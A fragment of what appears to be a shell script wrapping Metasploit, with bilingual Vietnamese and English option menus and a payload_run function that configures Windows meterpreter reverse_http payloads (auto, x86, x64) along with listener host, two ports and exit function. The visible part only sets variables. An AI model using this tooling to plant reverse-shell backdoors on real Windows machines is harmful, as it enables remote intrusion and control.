...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/auto/meterpreter/reverse_http):
...
no="     no "
cat << !
Payload options (windows/auto/meterpreter/reverse_http):
...
function payload_run {
	paylo="windows/auto/meterpreter/reverse_http"
	paylo1="windows/meterpreter/reverse_http"
	paylo2="windows/x64/meterpreter/reverse_http"
	lhost=$lhost
	lport1=$lport1
	lport2=$lport2
	exitfunc=$exitfunc
